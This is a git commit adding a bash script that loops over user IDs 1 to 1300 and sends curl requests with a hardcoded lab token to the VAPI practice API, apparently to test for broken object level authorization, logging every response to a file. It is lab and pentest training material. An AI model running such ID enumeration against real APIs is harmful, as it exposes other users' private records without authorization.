fe6de111d4c43a648c1cfa4ddeb1165e6e7b8d30
Tom R <137434709+mr-tomr@users.noreply.github.com>
2023-09-28 14:54:56 -0400

    Create AP1-2023-BrokenObjectLevelAuthorization-UserIDs.sh

---
+++ API/AP1-2023-BrokenObjectLevelAuthorization-UserIDs.sh
@@ -0,0 +1,31 @@
+# Shell script to fuzz for BOLA based upon user ID numbers.
+# Created by Tom R. 20230928
+
+# Based upon working with VAPI.
+# Creates a grepable file which can be searched for values.
+# Create your number list using the command 'seq 1 1300 > numbers.txt' 
+
+#!/bin/bash
+
+# Read each line from numbers.txt
+while read -r line; do
+  # Execute curl command by replacing 1 with the current line's number
+  output=$(curl -i -s -k -X $'GET' \
+    -H $'Authorization-Token: cGhvZW5peDpwYXNzd29yZA==' \
+    -H $'Content-Type: application/json' \
+    -H $'User-Agent: PostmanRuntime/7.33.0' \
+    -H $'Accept: */*' \
+    -H $'Cache-Control: no-cache' \
+    -H $'Postman-Token: 01f323c8-ca43-4e2e-a137-631eb867ab77' \
+    -H $'Host: vapi' \
+    -H $'Accept-Encoding: gzip, deflate' \
+    -H $'Connection: keep-alive' \
+    "http://vapi/vapi/api1/user/${line}")
+  
+  # Print the output to stdout (the screen)
+  echo "$output"
+  
+  # Append the output to output.txt
+  echo "$output" >> output.txt
+done < numbers.txt
+
